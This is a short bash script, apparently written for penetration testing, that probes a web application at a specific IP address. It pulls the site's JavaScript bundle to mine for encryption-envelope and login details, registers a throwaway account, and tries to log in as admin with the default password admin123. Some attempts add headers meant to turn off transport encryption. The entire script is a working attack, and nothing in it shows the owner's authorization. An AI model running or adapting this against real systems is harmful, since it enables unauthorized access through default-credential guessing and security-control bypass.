#!/bin/bash
set +e
echo "### START $(date -u +%FT%TZ)"
B=http://123.184.7.135
timeout 40 curl -s -m 35 "$B/static/js/index-BNjkZWLR.js" -o /tmp/b.js -w "js code=%{http_code} len=%{size_download}\n"
echo "### ENVELOPE-STRINGS"
grep -aoE ".{40}(RSA_OAEP|envelope|Envelope|X-Transport|kid|transportCrypto).{60}" /tmp/b.js | head -12
echo "### LOGIN-HINTS"
grep -aoE ".{30}(/login|username).{80}" /tmp/b.js | head -8
echo "### REGISTER-CONFIRM"
TS=$(date +%s)
timeout 10 curl -s -m 8 -X POST "$B/prod-api/register" -H 'Content-Type: application/json' -d "{\"username\":\"ul5512_$TS\",\"password\":\"Ul5512!pass\",\"confirmPassword\":\"Ul5512!pass\",\"code\":\"\",\"uuid\":\"\"}" -w "|%{http_code}\n" | head -c 300; echo
echo "### LOGIN-VARIANTS"
for h in "" "-H X-Transport-Crypto:off" "-H X-Envelope-Mode:off" "-H Content-Type:application/x-www-form-urlencoded"; do
  R=$(timeout 10 curl -s -m 8 -X POST "$B/prod-api/login" $h -d '{"username":"admin","password":"admin123"}' -w "|%{http_code}")
  echo "L [$h] => $(echo "$R" | head -c 200 | tr '\n' ' ')"
done
timeout 10 curl -s -m 8 -X POST "$B/prod-api/login" -d 'username=admin&password=admin123' -H 'Content-Type: application/x-www-form-urlencoded' -w "|%{http_code}\n" | head -c 250; echo
echo "### END $(date -u +%FT%TZ)"
